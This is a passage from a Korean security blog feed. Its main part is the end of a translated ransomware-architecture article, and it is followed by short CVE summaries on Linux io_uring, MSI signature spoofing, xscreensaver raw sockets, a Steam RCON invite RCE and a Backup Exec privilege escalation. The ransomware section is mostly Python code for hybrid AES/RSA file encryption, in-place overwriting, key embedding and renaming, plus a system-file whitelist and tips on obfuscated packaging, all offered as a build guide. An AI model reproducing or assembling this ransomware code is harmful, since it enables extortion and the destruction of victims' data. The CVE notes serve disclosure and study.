file)</code>: 암호화 로직을 포함하므로 가장 복잡한 부분이다. 아래에 자세히 설명할 거지만, 이름으로 볼 수 있듯이 파일을 암호화하는 함수다.</li><li><code>symDecryptFile(privateKey, file)</code>: 파일을 복호화한다.</li><li><code>symEncryptDirectory(publicKey, dir)</code>: 파라미터로 디렉터리를 받아서 내부에 있는 모든 파일을 가져온다. 그 후 <code>symEncryptFile</code>를 호출한다.</li><li><code>symDecryptDirectory(privateKey, dir)</code>: <code>symEncryptDirectory</code>와 비슷하지만 반대의 기능을 한다.</li></ul><h1 id="rsaEncryptSecret"><a href="#rsaEncryptSecret" class="headerlink" title="rsaEncryptSecret"></a>rsaEncryptSecret</h1><p>RSA를 통해 secret key를 암호화할 것이다. RSA는 기본적으로 랜덤성 없이 암호화 되므로 기본적인 RSA에 랜덤성과 <a href="https://en.wikipedia.org/wiki/Trapdoor_function">one-way permutation trapdoor</a>를 추가한 padding scheme인 <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding">Optimal asymmetric encryption padding(OAEP)</a>를 사용할 것이다. OAEP와 같이 RSA를 사용할 때 결과 cypher 크기는 modulus(<code>key size/8</code>)과 같아야 한다. 2048bit RSA를 사용하므로 256 bytes의 resulting cyphertext가 나와야 한다.</p><p>이에 대한 간단한 예제 코드이다.</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rsaEncryptSecret</span>(<span class="hljs-params">string, publicKey</span>):</span>  public_key = get_key(publicKey, <span class="hljs-literal">None</span>)  <span class="hljs-comment"># Create the cipher object</span>  cipher_rsa = PKCS1_OAEP.new(public_key)  <span class="hljs-comment"># We need to encode the string to work with bytes instead of chars</span>  bytestrings = str.encode(string)  cipher_text = cipher_rsa.encrypt(bytestrings)  <span class="hljs-comment">#At this point the cipher_text should be 256 bytes in length</span>  <span class="hljs-comment"># We&#x27;ll base64 encode it for convenience</span>  <span class="hljs-comment"># Remember that a base64 string needs to be divisible by 3, so 256 bytes will become 258 with padding </span>  <span class="hljs-keyword">return</span> base64.b64encode(cipher_text)</code></pre><p><img src="/2021/04/25/idioth/arch_of_ransomware_part2/Untitled%203.png"></p><p>Source: <a href="https://stackoverflow.com/questions/13378815/base64-length-calculation">https://stackoverflow.com/questions/13378815/base64-length-calculation</a></p><h1 id="RsaDecryptSecret"><a href="#RsaDecryptSecret" class="headerlink" title="RsaDecryptSecret"></a>RsaDecryptSecret</h1><p>제공된 secret key로 cipher text를 복호화한다.</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rsaDecryptSecret</span>(<span class="hljs-params">string, privateKey</span>):</span>  <span class="hljs-comment"># We firts import the private Key</span>  private_key = get_key(privateKey, <span class="hljs-literal">None</span>)  <span class="hljs-comment"># Decode the base64 encoded string</span>  base64DecodedSecret = base64.b64decode(string)  <span class="hljs-comment"># create the cipher object</span>  cipher_rsa = PKCS1_OAEP.new(private_key)  <span class="hljs-comment"># Decrypt the content</span>  decryptedBytestrings = cipher_rsa.decrypt(base64DecodedSecret)  <span class="hljs-comment"># Remember to convert the decoded cipher from bytes to string</span>  decryptedSecret = decryptedBytestrings.decode()  <span class="hljs-keyword">return</span> decryptedSecret</code></pre><h1 id="SymEncryptFile"><a href="#SymEncryptFile" class="headerlink" title="SymEncryptFile"></a>SymEncryptFile</h1><p>주요 암호화 함수이며 다음과 같이 동작한다.</p><ol><li><p>publicKey와 file path를 파라미터로 함수를 호출한다.</p> <pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">symEncryptFile</span>(<span class="hljs-params">publicKey, file</span>):</span></code></pre></li><li><p>특정 파일에 대한 랜덤 키를 생성한다.</p> <pre><code class="hljs python">key = generateKey()</code></pre></li><li><p>publicKey로 랜덤 키를 암호화한다.</p> <pre><code class="hljs python">encryptedKey = rsaEncryptSecret(key, publicKey)</code></pre></li><li><p>파일에 대한 암호화 사이즈(n byte)를 정의한다. 예시로 1MB를 사용한다.</p> <pre><code class="hljs python">buffer_size = <span class="hljs-number">1048576</span></code></pre></li><li><p>파일이 이미 암호화되었는지 확인한다. 이미 되어있을 경우 무시한다.</p> <pre><code class="hljs python"><span class="hljs-keyword">if</span> file.endswitch(<span class="hljs-string">&quot;.&quot;</span> + cryptoName):print(<span class="hljs-string">&#x27;File is already encrypted, skipping&#x27;</span>)<span class="hljs-keyword">return</span></code></pre></li><li><p>파일의 첫 n 바이트를 암호화하고 content를 overwrite 한다.</p> <pre><code class="hljs python"><span class="hljs-comment"># Open the input and output files</span>input_file = open(file, <span class="hljs-string">&#x27;r+b&#x27;</span>)print(<span class="hljs-string">&quot;Encrypting file: &quot;</span>+ file)output_file = open(file + <span class="hljs-string">&#x27;.&#x27;</span> + cryptoName, <span class="hljs-string">&#x27;w+b&#x27;</span>)<span class="hljs-comment"># Create the cipher object and encrypt the data</span>cipher_encrypt = AES.new(key, AES.MODE_CFB)<span class="hljs-comment"># Encrypt file first</span>input_file.seek(<span class="hljs-number">0</span>)buffer = input_file.read(buffer_size)ciphered_bytes = cipher_encrypt.encrypt(buffer)input_file.seek(<span class="hljs-number">0</span>)input_file.write(ciphered_bytes)</code></pre><p> <img src="/2021/04/25/idioth/arch_of_ransomware_part2/Untitled%204.png"></p></li><li><p>파일의 끝에 암호화된 랜덤 키를 추가한다.</p> <pre><code class="hljs python">input_file.seek(<span class="hljs-number">0</span>, os.SEEK_END)input_file.write(encryptedKey.encode())</code></pre></li><li><p>파일의 끝에 AES IV(initialization vector)를 추가한다.</p> <pre><code class="hljs python">input_file.seek(<span class="hljs-number">0</span>, os.SEEK_END)input_file.write(cipher_encrypt.iv)</code></pre></li><li><p>암호화가 된 지 식별할 수 있도록 이름을 바꾼다.</p> <pre><code class="hljs python">input_file.close()  os.rename(file, file + <span class="hljs-string">&quot;.&quot;</span> + cryptoName)</code></pre></li></ol><p><img src="/2021/04/25/idioth/arch_of_ransomware_part2/Untitled%205.png"></p><blockquote><p>암호화 후 대략적인 파일 구조</p></blockquote><p>전체 파일을 복사할 필요가 없었던 것을 생각해라. file object를 통해 <code>seek()</code> 메소드를 사용하여 바이트를 탐색하고 빠르게 작업을 진행할 수 있다. 이는 복호화 함수에서도 사용된다.</p><p>또 암호화된 파일에 AES IV와 암호화된 키를 모두 추가하기 때문에 각 파일에 대한 키가 존재하는 텍스트 파일은 필요 없다. victim은 우리에게 어떤 파일이든 보낼 수 있고 특정한 바이너리에서 사용되는 private key를 가지고 있으면 우리는 복호화할 수 있다.</p><p><img src="/2021/04/25/idioth/arch_of_ransomware_part2/Untitled%206.png"></p><h1 id="SymDecryptFile"><a href="#SymDecryptFile" class="headerlink" title="SymDecryptFile"></a>SymDecryptFile</h1><p>주요 복호화 함수이며 다음과 같이 동작한다.</p><ol><li><p>privateKey와 file path를 파라미터로 함수를 호출한다.</p> <pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">symDecryptFile</span>(<span class="hljs-params">privateKey, file</span>):</span></code></pre></li><li><p>파일에 대한 decryption size(n 바이트, 암호화에서 쓴 것과 동일)를 정의해라. 예시는 1MB이다.</p> <pre><code class="hljs python">buffer_size = <span class="hljs-number">1048576</span></code></pre></li><li><p>확장자를 통해 암호화 여부를 확인한다.</p> <pre><code class="hljs python"><span class="hljs-keyword">if</span> file.endswith(<span class="hljs-string">&quot;.&quot;</span> + cryptoName):out_filename = file[:-(len(cryptoName) + <span class="hljs-number">1</span>)]print(<span class="hljs-string">&quot;Decrypting file: &quot;</span> + file)<span class="hljs-keyword">else</span> :print(<span class="hljs-string">&#x27;File is not encrypted&#x27;</span>)<span class="hljs-keyword">return</span></code></pre></li><li><p>파일을 열어 AES IV(마지막 16바이트)를 읽어온다.</p> <pre><code class="hljs python">input_file = open(file, <span class="hljs-string">&#x27;r+b&#x27;</span>)<span class="hljs-comment"># Read in the iv</span>input_file.seek(<span class="hljs-number">-16</span>, os.SEEK_END)iv = input_file.read(<span class="hljs-number">16</span>)</code></pre></li><li><p>암호화된 복호화 키를 읽어온다.</p> <pre><code class="hljs python"><span class="hljs-comment"># we move the pointer to 274 bbytes before the end of file</span><span class="hljs-comment"># (258 bytes of the encryption key + 16 of the AES IV)</span>input_file.seek(<span class="hljs-number">-274</span>, os.SEEK_END)<span class="hljs-comment"># And we read the 258 bytes of the key</span>secret = input_file.read(<span class="hljs-number">258</span>)</code></pre></li><li><p>private key를 가지고 암호화된 키를 복호화한다.</p> <pre><code class="hljs python">key = rsaDecryptSecret(cert, secret)</code></pre></li><li><p>이전에 정의한 aes-encrypted buffer size를 복호화하고 파일의 첫 부분에 작성한다.</p> <pre><code class="hljs python"><span class="hljs-comment"># Create the cipher object</span>cipher_encrypt = AES.new(privateKey, AES.MODE_CFB, iv=iv)<span class="hljs-comment"># Read the encrypted header</span>input_file.seek(<span class="hljs-number">0</span>)buffer = input_file.read(buffer_size)<span class="hljs-comment"># Decrypt the header with the key</span>decrypted_bytes = cipher_encrypt.decrypt(buffer)<span class="hljs-comment"># Write the decrypted text on the same file</span>input_file.seek(<span class="hljs-number">0</span>)input_file.write(decrypted_bytes)</code></pre></li><li><p>파일의 끝 부분에서 IV와 암호화된 키를 제거하고 이름을 변경한다.</p> <pre><code class="hljs python"><span class="hljs-comment"># Delete the last 274 bytes from IV + key.</span>input_file.seek(<span class="hljs-number">-274</span>, os.SEEK_END)input_file.truncate()input_file.close()<span class="hljs-comment"># Rename the file to delete the encrypted extenstion</span>os.rename(file, out_filename)</code></pre></li></ol><h1 id="마지막-고려사항"><a href="#마지막-고려사항" class="headerlink" title="마지막 고려사항"></a>마지막 고려사항</h1><p>모든 함수 작성이 끝나면 선택한 폴더를 암호화하거나 복호화할 수 있는 바이너리를 만들 수 있다. 정확하게 <code>symEncryptDirectory/symDecryptDirectory</code> 함수를 코딩했으면 암호화, 복호화 중 하나를 선택한 후 <code>.pem</code> 파일을 전달하기만 하면 된다. main 호출 전에 바이너리에 이것과 비슷한 것이 있을 것이다</p><pre><code class="hljs python">parser = argparse.ArgumentParser()parser.add_argument(<span class="hljs-string">&quot;--dest&quot;</span>, <span class="hljs-string">&quot;-d&quot;</span>, help=<span class="hljs-string">&quot;File or directory to encrypt/decrypt&quot;</span>, dest=<span class="hljs-string">&quot;destination&quot;</span>, default=<span class="hljs-string">&quot;none&quot;</span>, required=<span class="hljs-literal">True</span>)parser.add_argument(<span class="hljs-string">&quot;--action&quot;</span>, <span class="hljs-string">&quot;-a&quot;</span>, help=<span class="hljs-string">&quot;Action (encrypt/decrypt)&quot;</span>, dest=<span class="hljs-string">&quot;action&quot;</span>, required=<span class="hljs-literal">True</span>) parser.add_argument(<span class="hljs-string">&quot;--pem&quot;</span>,<span class="hljs-string">&quot;-p&quot;</span>, help=<span class="hljs-string">&quot;Public/Private key&quot;</span>, dest=<span class="hljs-string">&quot;key&quot;</span>, required=<span class="hljs-literal">True</span>)</code></pre><p>오류 검사(암호화 작업에 파라미터로 public key가 전달되는지, decrypt에 private key가 있는지 등) 외에도 운영 체제에 대한 파일 및 폴더를 화이트 리스트로 지정해야 한다. 암호화되더라도 컴퓨터는 사용이 가능하도록 해야 한다. 모든 파일을 암호화한다면 다음과 같은 결과를 볼 수 있다.</p><ol><li>사용자가 뭔가 잘못된 걸 알 수 있도록 컴퓨터 사용이 불가능해진다.</li><li>전부 암호화된 후, 시스템이 부팅이 안되고 사용자는 랜섬웨어에 감염된 사실을 알지 못한다.</li></ol><p>예시로 리눅스 화이트 리스트는 다음과 같다.</p><pre><code class="hljs ini"><span class="hljs-attr">whitelist</span> = [<span class="hljs-string">&quot;/etc/ssh&quot;</span>, <span class="hljs-string">&quot;/etc/pam.d&quot;</span>, <span class="hljs-string">&quot;/etc/security/&quot;</span>, <span class="hljs-string">&quot;/boot&quot;</span>,<span class="hljs-string">&quot;/run&quot;</span>, <span class="hljs-string">&quot;/usr&quot;</span>, <span class="hljs-string">&quot;/snap&quot;</span>, <span class="hljs-string">&quot;/var&quot;</span>, <span class="hljs-string">&quot;/sys&quot;</span>, <span class="hljs-string">&quot;/proc&quot;</span>, <span class="hljs-string">&quot;/dev&quot;</span>, <span class="hljs-string">&quot;/bin&quot;</span>,<span class="hljs-string">&quot;/sbin&quot;</span>, <span class="hljs-string">&quot;/lib&quot;</span>, <span class="hljs-string">&quot;passwd&quot;</span>, <span class="hljs-string">&quot;shadow&quot;</span>, <span class="hljs-string">&quot;known_hosts&quot;</span>, <span class="hljs-string">&quot;sshd_config&quot;</span>,<span class="hljs-string">&quot;/home/sec/.viminfo&quot;</span>, <span class="hljs-string">&#x27;/etc/crontab&#x27;</span>, <span class="hljs-string">&quot;/etc/default/locale&quot;</span>, <span class="hljs-string">&quot;/etc/environment&quot;</span>]</code></pre><p><code>.py</code> 스크립트를 모든 dependency와 함께 압축하여 단일 실행 파일로 만들 수 있다. 일일이 알려주진 않겠지만 <a href="https://pypi.org/project/pyarmor/">pyarmor</a>와 <a href="https://www.pyinstaller.org/">pyinstaller</a>를 찾아보면 된다. 또 사용하려는 난독화에 따라서 <a href="https://github.com/Nuitka/Nuitka">Nuitka</a>가 도움이 될 수도 있다.</p><h1 id="다른-종류의-랜섬웨어-MBR-암호화"><a href="#다른-종류의-랜섬웨어-MBR-암호화" class="headerlink" title="다른 종류의 랜섬웨어(MBR 암호화)"></a>다른 종류의 랜섬웨어(MBR 암호화)</h1><p>우리가 살펴보지 않은 드라이브의 <a href="https://en.wikipedia.org/wiki/Master_boot_record">Master Boot Record</a>를 감염시키는 다른 종류의 랜섬웨어가 있다. 파일 시스템의 NTFS 파일 테이블을 암호화하는 페이로드를 실행하여 디스크를 사용할 수 없게 만든다. 이 방법은 데이터의 작은 부분만 암호화하면 돼서 매우 빠르다. <a href="https://en.wikipedia.org/wiki/Petya_(malware)">Petya 랜섬웨어</a>가 이 종류의 완벽한 예시이다. 하지만 이는 3개의 주요한 단점을 가지고 있다.</p><p>첫 번째로 OS를 부팅할 수 없어도 포렌식 분석을 통해 파일을 복구할 수 있다. 파일들은 삭제되지 않고 파일 테이블에서 참조되지 않을 될 뿐이다. 컴퓨터가 재부팅 된 후에 raw data를 암호화 하더라도 victim이 컴퓨터를 끄고 디스크를 빼버리면 일부 파일을 복구할 수 있다.</p><p>두 번째 단점은 대부분 <a href="https://www.howtogeek.com/193669/whats-the-difference-between-gpt-and-mbr-when-partitioning-a-drive/">최신 OS는 GPT(GUID Partition Table)을 사용하여 MBR을 더 이상 쓰지 않는다</a>는 것이다.</p><p>세 번째 단점은 파일 시스템 의존성이 높고 NTFS처럼 동작하지 않는 파일 시스템(EXT3/EXT4, ZFS 등)도 고려하기 위해 수정해야 한다는 점이다.</p><p>이 방법은 더 많은 low-level technical concept을 요구하여 이 게시글에서 많이 설명하고 싶지 않다. 또한 이 방법론은 많이 사용되지 않는다. 필자의 주목적은 일반적인 랜섬웨어에 대해 독자들이 더 잘 이해할 수 있도록 하는 것이다.</p><h1 id="결론"><a href="#결론" class="headerlink" title="결론"></a>결론</h1><p>랜섬웨어를 방지하는 방법들(출처를 알 수 없는 파일 열지 말기, 인프라 업데이트 유지, 안티 멀웨어 소프트웨어 사용하기 등등) 외에도 추천하는 방법은 백업과 백업 그리고 또 백업이다. 공격을 막기 위한 많은 조언을 듣게 되겠지만 필자의 생각에는 그냥 걸릴 거라 생각하고 데이터를 오프라인 백업하는 것이다.</p><p><img src="/2021/04/25/idioth/arch_of_ransomware_part2/Untitled%207.png"></p><p>당신이 감염을 피한다 해도 동료 직원이 걸리면 매핑된 공유 드라이브의 모든 파일이 암호화 될 것이다.</p><blockquote><p>마지막으로 아무도 추천하지 않은 방법: 감염된 경우, 암호화된 파일(가족사진, 비디오 등)을 바로 복구할 필요가 없으면 암호화된 파일의 복사본을 보관해라. 멀웨어 개발자가 은퇴(Shade, TeslaCrypt, HildaCrypt)하거나 체포(CoinVault)되거나 경쟁자의 키를 배포(Petya vs Chimera)하는 등 해독 키가 공개될 수 있다. 운 좋으면 몇 달 안에 복구할 수 있다.</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Translation</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>malware</tag>
      
      <tag>crypto</tag>
      
      <tag>ransomware</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-20226: Linux kernel Reference counting bug</title>
    <link href="/2021/04/24/fabu1ous/2021-04-24/"/>
    <url>/2021/04/24/fabu1ous/2021-04-24/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/4/22/cve-2021-20226-a-reference-counting-bug-in-the-linux-kernel-iouring-subsystem">CVE-2021-20226</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Linux kernel 5.6</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Linux kernel 5.1에서 하나의 시스템콜로 여러 I/O작업을 수행할 수 있는 io_uring(비동기 I/O) 기능이 도입되었습니다. Linux kernel 5.6으로 올라오면서 해당 기능에 취약점이 생겼습니다. 시스템 콜이 커널 쓰레드로 <code>files_structure</code>를 전달해도 <code>io_grab_files()</code>의 reference counter가 증가하지 않아 <code>IORING_OP_CLOSE</code>작업이 진행되는 동안 <code>files_structure</code>의 존재 유무를 판단하지 못하게 됩니다. 즉, 해당 <code>files_structure</code>가 할당 해체된 이후에도 접근할 수 있게 되고 DoS로 이어질 수 있습니다.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">io_grab_files</span><span class="hljs-params">(struct io_kiocb *req)</span> </span><span class="hljs-function"></span>&#123; <span class="hljs-comment">// ... </span>     rcu_read_lock();     spin_lock_irq(&amp;ctx-&gt;inflight_lock);spin_lock_irq(&amp;ctx-&gt;inflight_lock);      <span class="hljs-keyword">if</span> (fcheck(ctx-&gt;ring_fd) == ctx-&gt;ring_file) &#123;         list_add(&amp;req-&gt;inflight_entry, &amp;ctx-&gt;inflight_list);         req-&gt;flags |= REQ_F_INFLIGHT;         req-&gt;work.files = current-&gt;files;  <span class="hljs-comment">// vuln here</span>        ret = <span class="hljs-number">0</span>;     &#125;     spin_unlock_irq(&amp;ctx-&gt;inflight_lock);     rcu_read_unlock();      <span class="hljs-keyword">return</span> ret; &#125;</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-26413: Windows Installer Signature Spoofing 취약점</title>
    <link href="/2021/04/23/insu/2021-04-23/"/>
    <url>/2021/04/23/insu/2021-04-23/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://sec.okta.com/articles/2021/04/uncovering-and-disclosing-signature-spoofing-vulnerability-windows">Uncovering and Disclosing a Signature Spoofing Vulnerability in Windows Installer: CVE-2021-26413</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows Installer</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows Installer (MSI) Authenticode 시그니처 유효성 검사를 우회하여 해커에 의해 조작된 패키지를 합법적인 소프트웨어로 위장할 수 있는 취약점이 발견되었습니다.</p><p>Windows Installer 파일의 시그니처를 검증하기 위해 OS나 사용자는 <code>WinVerifyTrust</code> 또는 <code>WinVerifyTrustEx</code> 함수를 호출합니다. 이 함수는 파일의 type을 확인하고 Subject Interface Package(SIP, MSI의 경우 <code>MSISIP.dll</code>)를 로드합니다. 그 후 <code>MsiSIPGetSignedDataMsg</code>와 <code>MsiSIPVerifyIndirectData</code>를 호출하여 레지스트리에서 Signature Data를 검색하고 확인하는 DLL exports의 이름들을 쿼리 합니다.</p><p>MSI 파일은 Compound File Binary format을 따릅니다. 이 형식의 파일들은 이 format의 파일들은 Storage object가 디렉터리 역할을 하고 Steam obejct가 파일 역할을 하는 파일 시스템입니다. <code>MsiSIPGetSignedDataMsg</code> 함수는 <code>\\x05DigitalSignature</code> stream에서 signature data를 얻고 <code>MsiSIPVerifyIndirectData</code> 함수는 root directory storage object부터 계산하고 검증합니다.</p><p>exploit은 <code>MSISIP.dll</code>에서 할당되지 않은 byte들을 고려하는데 실패해서 일어납니다.</p><blockquote><p>Usually, a compound file includes ranges of bytes that are not allocated for either CFB structures or user-defined data. For instance, each stream whose length is not an exact multiple of the sector size requires a trailing portion of the last sector in the stream’s sector chain to be unused. Implementations that fail to initialize these byte ranges to zero (as recommended in section 2.7) might unintentionally leak user data.</p></blockquote><p>이 할당되지 않은 byte들은 시그니처를 검증하고 계산하는데 고려되지 않습니다. 이를 통해 공격자는 악의적인 데이터를 삽입할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
      <tag>insu</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-31523: linux 화면보호기 xscreensaver의 소켓 정보유출 취약점</title>
    <link href="/2021/04/23/l0ch/2021-04-23/"/>
    <url>/2021/04/23/l0ch/2021-04-23/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2174">Issue 2174: xscreensaver: raw socket leaked</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Debian xscreensaver 5.42 + dfsg1-1</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>linux용 오픈소스 화면 보호기인 xscreensaver의 debian 배포판에서 발견된 소켓 정보유출 취약점의 세부 정보가 공개되었습니다.</p><p>xscreensaver의 다음 경로에 일반 계정의 패킷 캡처를 허용하는 <code>cap_net_raw=p</code> 권한이 활성화되어있습니다.</p><pre><code class="hljs cpp">$ getcap /usr/libexec/xscreensaver/sonar/usr/libexec/xscreensaver/sonar cap_net_raw=p</code></pre><p>해커는 이러한 권한을 이용해 원시 소켓을 얻고 정보를 출력하는 코드를 포함하거나 tcpdump 명령어를 실행하는 드라이버를 컴파일합니다.</p><pre><code class="hljs c"><span class="hljs-comment">// Enable CAP_NET_RAW</span>caps = cap_get_proc();cap_set_flag(caps, CAP_EFFECTIVE, <span class="hljs-number">1</span>, caplist, CAP_SET);cap_set_proc(caps);cap_free(caps);<span class="hljs-comment">// Now we can get a raw socket.</span>sock = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);</code></pre><p>이를 <code>MESA_LOADER_DRIVER_OVERRIDE</code> 환경변수 설정을 통해 xscreensaver에서 로드하도록 하면 root가 아닌 일반 사용자 계정에서 소켓 정보를 유출할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>linux</tag>
      
      <tag>information disclosure</tag>
      
      <tag>L0ch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-30481: Steam 게임 초대를 통한 원격 코드 실행 취약점</title>
    <link href="/2021/04/22/idioth/2021-04-22/"/>
    <url>/2021/04/22/idioth/2021-04-22/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://secret.club/2021/04/20/source-engine-rce-invite.html">CVE-2021-30481: Source engine remote code execution via game invites</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Valve Steam through 2021-04-10</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Valve의 PC 게임 런처 Steam에서 <a href="https://partner.steamgames.com/doc/sdk/api">Steamworks API</a>를 사용하여 원격 코드 실행을 할 수 있는 취약점이 발견되었습니다. Steamworks API는 게임 개발자들이 interface set을 통해 게임 내에서 다양한 Steam 기능에 접근할 수 있게 해주는 API입니다.</p><p>취약점이 존재하는 함수는 <code>InviteUserToGame</code> 함수입니다.</p><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">InviteUserToGame</span><span class="hljs-params">(CSteamID steamIDFriend, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *pchConnectString)</span></span>;</code></pre><p>해당 함수는 친구가 게임을 시작하지 않은 경우 게임 프로세스에서 친구를 매개 변수로 지정하여 Command line 끝에 추가됩니다. 게임 내 콘솔이 존재하는 경우 게임 내 콘솔에서 실행이 되지만 Source Engine 게임의 경우 콘솔 command를 지정할 때 제한이 없습니다. 따라서 원하는 게임 명령을 임의로 실행할 수 있습니다.</p><p>많은 source engine 게임에는 <a href="https://developer.valvesoftware.com/wiki/Source_RCON_Protocol">Source RCON Protocol</a>이 존재합니다. 이 프로토콜을 사용하여 서버 소유자가 게임 클라이언트에서 수행하는 것과 동일한 방식으로 게임 서버 context에서 콘솔 명령을 실행할 수 있습니다. 게임 서버에 연결하기 위해서는 <code>rcon_address</code>와 <code>rcon_password</code> 명령을 통해 연결을 인증해야 합니다. 해커가 <code>InviteUserToGame</code>의 두 번째 파라미터를 <code>+rcon_address ip:port +rcon&quot;</code>으로 설정하여 초대를 보내면 해당 초대를 수락한 사용자는 어떠한 알림도 없이 해당 주소로 연결이 됩니다. 악의적인 RCON 서버를 호스팅 하는 해커는 <code>SERVERDATA_SCREENSHOT_RESPONSE</code> 패킷을 통해 RCON 서버에 연결된 사용자에게 임의의 ZIP archive 파일(<code>screenshot.jpg</code>)을 업로드할 수 있습니다.</p><p>아카이브 내의 <code>screanshot.jpg</code> 파일 정보를 검색하는 <code>CRConClient::SaveRemoteScreenshot</code> 함수가 호출되면 <code>FindZipItem</code>이 호출됩니다. <code>FindZipItem</code>에서 <code>lufseek</code>을 사용할 때 내부 파일 포인터인 <code>s-&gt;cur_file_info_internal.offset_curfile</code> 부분을 수정하여 스택을 조작할 수 있습니다. 파일 스트림이 <code>0xFFFFFFFE</code>을 가리키면 <code>lufread</code>에서 언더플로우가 발생하게 되어 offset을 손상시킨 후 ROP chain을 구성할 수 있습니다. 해당 취약점의 POC는 <a href="https://github.com/floesen/CVE-2021-30481">github</a>에서 확인하실 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>idioth</tag>
      
      <tag>steam</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-36167: OpenSSL Backup Exec Service 권한상승</title>
    <link href="/2021/04/21/fabu1ous/2021-04-21/"/>
    <url>/2021/04/21/fabu1ous/2021-04-21/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.veritas.com/content/support/en_US/security/VTS20-010">MySQL for Windows is vulnerable to privilege escalation due to OPENSSLDIR location</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>MySQL for Windows Backup Exec BE 20.x, BE 21.x, 16.x</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>윈도우용 MySQL에는 OPENSSLDIR 변수 사용으로 인한 권한상승 취약점이 있습니다.</p><p>부팅 시 Backup Exec service는 OpenSSL 라이브러리를 로드하고 해당 라이브러리는 <code>/usr/local/ssl/openssl.cnf </code> 또는 <code>C:\usr\local\ssl\openssl.cnf</code>의 로드를 시도합니다. 낮은 권한의 일반 유저라도 <code>C:\usr\local\ssl\</code>에 접근 권한을 갖고 있으며 <code>opensll.cnf</code>를 작성할 수 있습니다. 이를 악용해 OpenSSL 엔진을 가장한 악성코드가 로드되어 SYSTEM 권한으로 실행되도록 유도할 수 있습니다.</p><p>해커는 위와 같은 방법으로 상승된 권한을 통해 모든 데이터에 접근하고 설치된 모든 응용 프로그램에 접근할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>eop</tag>
      
      <tag>windows</tag>
      
      <tag>mysql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Translation] Exploiting System Mechanic Driver Part 1</title>
    <link href="/2021/04/21/l0ch/exploiting-driver/"/>
    <url>/2021/04/21/l0ch/exploiting-driver/</url>
    
